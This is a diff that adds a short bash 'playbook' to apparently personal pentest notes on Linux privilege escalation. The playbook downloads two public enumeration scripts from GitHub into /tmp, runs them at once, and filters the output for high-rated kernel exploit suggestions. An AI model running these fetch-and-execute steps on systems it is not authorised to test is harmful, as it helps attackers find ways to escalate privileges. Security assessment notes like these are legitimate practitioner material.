@@ -1315,3 +1315,26 @@ Linux Privilege Escalation:
 > getcap -r 2>/dev/null 
  
 
+### PLAYBOOK 1
+
+
+
+```bash
+mkdir -p /tmp/hvck
+cd /tmp/hvck
+
+# Linux Smart Enumeration 
+wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh 
+echo "Enumerating"
+bash lse.sh
+
+
+# LINUX EXPLOIT SUGGESTER 
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+bash les.sh > exploits.txt 
+cat exploits.txt | grep "high" -B3 -A3
+
+
+
+
+```
